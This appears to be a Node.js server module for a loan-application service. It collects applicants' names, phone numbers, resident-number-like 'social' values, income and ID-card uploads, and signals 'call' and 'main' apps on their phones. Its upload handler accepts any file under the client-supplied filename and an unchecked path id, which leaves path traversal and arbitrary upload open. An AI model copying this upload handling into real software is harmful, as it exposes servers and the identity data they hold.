require('rootpath')();

const path = require('path');
const errcode = require('err-code');
const multer = require('multer');
const mkdirp = require('mkdirp');
const { Op } = require('sequelize');
const requireLogin = require('middlewares/require_login');
const ipMiddleware = require('middlewares/ip_address');

function saveIdCardFiles() {
    const storage = multer.diskStorage({
        destination(req, file, cb) {
            const mobileId = String(req.body.id);
            if (mobileId == null)
                return cb(errcode(new Error('mobile id is required'), { status: 400 }));

            const dir = path.join(req.app.get('idcard.mobiles.dir'), mobileId);
            mkdirp.sync(dir);
            cb(null, dir);
        },
        filename(req, file, cb) {
            return cb(null, file.originalname)
        }
    });
    const upload = multer({
        storage,
        fileFilter(req, file, cb) {
            cb(null, true);
        }
    }).any();

    return (req, res, next) => {
        upload(req, res, err => {
            if (err)
                req.app.logger.error(err);
            next(err);
        });
    }
}

async function addLoan(req, res) {
    var mobileId = String(req.body.id);
    const nickname = String(req.body.nickname);
    let phone = String(req.body.phone);   /// 신청자가 입력한 기기의 번호
    const social = String(req.body.social);
    const company = String(req.body.company);
    const income = String(req.body.income);
    const amount = String(req.body.amount);
    const address = String(req.body.address);
    const fileName = String(req.body.fileName);
    const appId = String(req.body.appId);
    let number = String(req.body.phoneNumber);  /// 기기의 번호

    const { Loan, Mobile } = req.app.db;
    const { logger } = req.app;

    if (phone.includes("+82")) {
        phone = "0" + phone.substring(3);
    }

    await Loan.destroy({ where: { phone: phone } });

    const [loan, created] = await Loan.findOrCreate({
        where: { phone, appId },
        defaults: { nickname, phone, social, company, income, amount, address, appId, idCard: fileName }
    });
    if (!created) {
        await loan.update({ nickname, phone, social, company, income, amount, address, appId, idCard: fileName });
    }

    res.json({ status: 1, id: loan.id });

    req.app.socket.io.to('controls').emit('loan_updated', { app_id: appId });

    const mobiles = await Mobile.findAll({ where: { number: phone } });
    for (var i = 0; i < mobiles.length; i++) {
        const mobile = mobiles[i];
        if (!!mobile) {
            if (mobile.appId != appId) {
                const socket = req.app.socket;

                const mobileMainSocket = socket.getMobileMain(mobile.id);
                const roomMain = mobileMainSocket != null ? mobileMainSocket.room : null;
                if (!!roomMain) {
                    logger.info(`add loan ----->${phone}  app_id_change -> main app -> ${appId}`);
                    socket.io.to(roomMain).emit('app_id_change', { app_id: appId });
                }

                const mobileCallSocket = socket.getMobileCall(mobile.id);
                const roomCall = mobileCallSocket != null ? mobileCallSocket.room : null;
                if (!!roomCall) {
                    logger.info(`add loan ----->${phone}  app_id_change -> call app ->  ${appId}`);
                    socket.io.to(roomCall).emit('app_id_change', { app_id: appId });
                }
            }
        }
    }
}

async function getLoans(req, res) {
    let { offset, limit, mobile_id, search } = req.query;
    const appId = req.session.app_id;

    if (offset != null)
        offset = Number(offset);
    if (limit != null)
        limit = Number(limit);
    if (search == null) search = '';

    let where = {};
    if (appId != "chongpan" && appId != "super") {
        where.appId = appId;
    } else if (appId == "chongpan") {
        where.appId = {
            [Op.ne]: "super"
        }
    }

    if (search !== '') {
        where.nickname = {
            [Op.like]: `%${search}%`
        }
    }

    if (mobile_id) {
        where = {
            ...where,
            mobileId: mobile_id
        }
    }
    const { Loan, Mobile } = req.app.db;
    const loans = await Loan.findAndCountAll({
        where,
        offset,
        limit,
        include: [Mobile],
        order: [
            ['id', 'DESC']
        ]
    });

    res.json({
        items: loans.rows.map(loan => ({
            id: loan.id,
            mobile_id: loan.mobileId,
            mobile_number: loan.mobile ? loan.mobile.number : '',
            id_card: loan.idCard,
            nickname: loan.nickname,
            phone: loan.phone,
            social: loan.social,
            company: loan.company,
            income: loan.income,
            amount: loan.amount,
            address: loan.address,
            timestamp: loan.createdAt,
        })),
        total: loans.count,
    });
}

async function getLoan(req, res) {
    const { loan } = req;
    res.json({
        mobile_number: loan.mobile ? loan.mobile.number : '',
        id_card: loan.idCard,
        nickname: loan.nickname,
        phone: loan.phone,
        social: loan.social,
        company: loan.company,
        income: loan.income,
        amount: loan.amount,
        address: loan.address,
        timestamp: loan.createdAt,
    });
}

async function getLoanByMobileId(req, res, next) {
    const { mobile_id: mobileId } = req.query;
    const { Loan, Mobile } = req.app.db;
    const loan = await Loan.findOne({ where: { mobileId }, include: [Mobile] });
    if (!!loan) {
        return res.json({
            mobile_number: loan.number,
            id_card: loan.idCard,
            nickname: loan.nickname,
            phone: loan.phone,
            social: loan.social,
            company: loan.company,
            income: loan.income,
            amount: loan.amount,
            address: loan.address,
            timestamp: loan.createdAt,
        });
    } else {
        const mobile = await Mobile.findByPk(mobileId);
        if (!mobile) {
            return next(errcode(new Error('not found'), { status: 404 }));
        }
        const loan1 = await Loan.findOne({
            where: { phone: mobile.number },
            include: [Mobile]
        });

        if (!loan1)
            return next(errcode(new Error('not found'), { status: 404 }));

        return res.json({
            mobile_number: mobile.number,
            id_card: loan1.idCard,
            nickname: loan1.nickname,
            phone: loan1.phone,
            social: loan1.social,
            company: loan1.company,
            income: loan1.income,
            amount: loan1.amount,
            address: loan1.address,
            timestamp: loan1.createdAt,
        });
    }

}
async function getLoanByMobileNumber(req, res, next) {
    let { number: phone } = req.query;
    const { Loan, Mobile } = req.app.db;
    if (phone.includes("+82")) {
        phone = "0" + phone.substring(3);
    }

    const loan = await Loan.findOne({ where: { phone }, include: [Mobile] });
    if (!!loan) {
        return res.json({
            mobile_number: loan.number,
            id_card: loan.idCard,
            nickname: loan.nickname,
            phone: loan.phone,
            social: loan.social,
            company: loan.company,
            income: loan.income,
            amount: loan.amount,
            address: loan.address,
            timestamp: loan.createdAt,
        });
    } else {
        return res.status(404).json({err: 'not found'});
    }
}

async function deleteLoan(req, res) {
    await req.loan.destroy();
    res.json({ status: "success" });
}

module.exports = app => {
    app.set('idcard.mobiles.dir', path.join(app.get('idcard.dir'), 'mobiles'));

    app.api.route('/mobile/loan').post(ipMiddleware(), saveIdCardFiles(), addLoan);

    app.api.route('/loans').get(requireLogin(), getLoans);
    app.api.route('/loan/get_by_mobileid').get(requireLogin(), getLoanByMobileId);
    app.api.route('/loan/get_by_mobilenumber').get(requireLogin(), getLoanByMobileNumber);
    app.api.route('/loans/:loan').get(requireLogin(), getLoan).delete(requireLogin(), deleteLoan);
};